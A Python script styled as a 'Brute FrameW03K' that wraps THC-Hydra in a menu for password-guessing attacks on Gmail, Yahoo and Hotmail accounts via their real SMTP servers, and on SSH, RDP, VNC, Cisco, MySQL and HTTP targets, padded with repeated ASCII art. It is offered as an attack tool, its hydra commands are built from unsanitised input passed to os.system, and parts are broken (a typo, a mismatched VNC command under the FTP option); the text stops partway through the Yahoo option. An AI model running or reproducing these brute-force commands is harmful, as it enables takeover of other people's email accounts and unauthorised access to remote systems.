# hydra bruteing automationm script

import os
import time 
import sys 
import colorama 
from colorama import *
import os
import time 
from os import system, name 
from time import sleep 
import sys

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

def prYellow(skk): print("\033[93m {}\033[00m" .format(skk)) 
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk)) 
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prRed(skk): print("\033[91m {}\033[00m" .format(skk)) 


while 1:
    S = str(input(" Enter S to start: "))
    if S.lower() == "s":
        break
    else:
        continue

def load_animation(): 
  
    load_str = "Loading BRUTEY."
    ls_len = len(load_str) 
  
    animation = "|/-\\|/-\|/-/"
    anicount = 0
      
    counttime = 0        
       
    i = 0                     
  
    while (counttime != 30): 
          

        time.sleep(0.075)  
                              
        load_str_list = list(load_str)  
 
        x = ord(load_str_list[i]) 
          
        y = 0                             

        if x != 32 and x != 46:              
            if x>90: 
                y = x-32
            else: 
                y = x + 32
            load_str_list[i]= chr(y) 
          
        res =''              
        for j in range(ls_len): 
            res = res + load_str_list[j] 
              
        sys.stdout.write("\r"+res + animation[anicount]) 
        sys.stdout.flush() 
  
        load_str = res 
  
          
        anicount = (anicount + 1)% 4
        i =(i + 1)% ls_len 
        counttime = counttime + 1

def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()

def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()

def screen_clear():
   if name == 'nt':
      _ = system('cls')

def CS(X):          # CS = clear sleep
   time.sleep(X)
   os.system("clear")        

if 'S' in S:
       print(Fore.MAGENTA+".............................................................................")
       os.system('                                              date                                  ')
       print(Fore.BLUE+".............................................................................")
       os.system(' clear ')
       time.sleep(0.1)
       print(Fore.RED+"                                         |")
       time.sleep(0.1)
       print(Fore.RED+"                  |                      |")
       time.sleep(0.1)
       print(Fore.RED+"                  |                    -/_\-")
       time.sleep(0.1)
       print(Fore.RED+"                -/_\-   ______________(/ . \)______________")
       time.sleep(0.1)
       print(Fore.RED+"   ____________(/ . \)_____________    \___/     <>")
       time.sleep(0.1)
       print(Fore.RED+"   <>           \___/      <>    <>")
       time.sleep(0.1)
       print(Fore.RED+"      || ") 
       time.sleep(0.1)
       print(Fore.RED+"      <> ")
       time.sleep(0.1)
       print(Fore.RED+"                            || ")
       time.sleep(0.1)
       print(Fore.RED+"                            <> ")
       time.sleep(0.1)
       print(Fore.RED+"                                       || ")
       time.sleep(0.1)
       print(Fore.RED+"                                       ||            BIG ")
       time.sleep(0.1)
       print(Fore.RED+"        _____               __         <>      (^)))^ BOOM!")
       time.sleep(0.1)
       print(Fore.RED+"  BOOM!/((  )\       BOOM!((  )))            (     ( ) ")
       time.sleep(0.1)
       print(Fore.RED+" ---- (__()__))          (() ) ))           (  (  (   ) ")
       time.sleep(0.1)
       print(Fore.RED+"     ||  |||____|------    \  (/   ___     (__\     /__)")
       time.sleep(0.1)
       print(Fore.RED+"      |__|||  |     |---|---|||___|   |___-----|||||")
       time.sleep(0.1)
       print(Fore.RED+"  |  ||.  |   |       |     |||                |||||")
       time.sleep(0.1)
       print(Fore.RED+"      |__|||  |     |---|---|||___|   |___-----|||||")
       time.sleep(0.1) 
       print(Fore.RED+"  |  ||.  |   |       |     |||                |||||")
       time.sleep(0.1)
       print(Fore.RED+" __________________________________________________________")
       time.sleep(0.1)
       print(Fore.RED+"+======================LOADING MODULE=======================+")
       time.sleep(0.1) 
       print(Fore.RED+"+Option A: Gmail Brute (THC-Hydra) ✅️                       +") 
       time.sleep(0.1) 
       print(Fore.RED+"+Option B: Yahoo Brute (THC-Hydra) ✅️                       +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option C: Hotmail Brute (THC-Hydra) ✅️                     +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option D: HTTP Brute (THC-Hydra) ✅️ ( does not work )      +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option E: SSH Brute (THC-Hydra) ✅️                         +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option F: TelNet Brute (THC-Hydra) ✅️                      +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option G: RDP Brute  (THC-Hydra) ✅️                        +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option H: MySQL Brute (THC-Hydra)                          +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option I: F T P Brute (THC-Hydra)                          +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option J: Cisco Brute (THC-Hydra)                          +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option K: VNC Brute (THC-Hydra)                            +")
       time.sleep(0.1) 
       print(Fore.RED+"+Option L: Router Speedy Brute (THC-Hydra)                  +")
       time.sleep(0.1) 
       print(Fore.RED+"+===========================================================+")
       time.sleep(0.1) 
X = str(input(" Options ==> "))

	                    

if 'L' in X:
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ')
       user = str(input(" User ==> "))
       word = str(input(" Wordlist ==> "))
       iphost= str(input(" IP/Hostname ==> "))
       os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()              

if 'K' in X:
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ') 
       word = str(input(" Wordlists ==> "))
       iphost = str(input(" IP/Host ==> "))
       os.system(" hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost)) 
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()              

if 'J' in X:
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ') 
       iphost = str(input(" IP?Hostname ==> "))
       word = str(ionput(" Wordlist ==> "))
       os.system("hydra -P %s %s cisco" % (word, iphost))
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()              

if 'I' in X:
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ') 
       user = str(input(" User ==> "))
       iphost = str(input(" IP/Hostname "))
       os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()              


if 'H' in X:
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ') 
       user = str(input(" User ==> "))
       word = str(input(" Wordlist ==> "))
       os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()              


if 'G' in X:
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ') 
       user = str(input(" User ==> "))
       word = str(input(" Wordlist ==> "))
       iphost = str(input(" IP/Hostname ==> "))
       os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()              


if 'E' in X:  
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ') 
       user = str(input(" User ==> "))
       word = str(input(" Wordlist ==> "))
       iphost = str(input(" IP/Hostname ==> "))
       os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()              


if 'C' in X:
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ') 
       email = str(input(" email ==> "))
       word = str(input(" wordlist ==> "))
       os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word)) 
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()              

if 'B' in X:
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ') 
       email = str(input(" email ==> "))
       word = str(input(" wordlist ==> "))
       os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
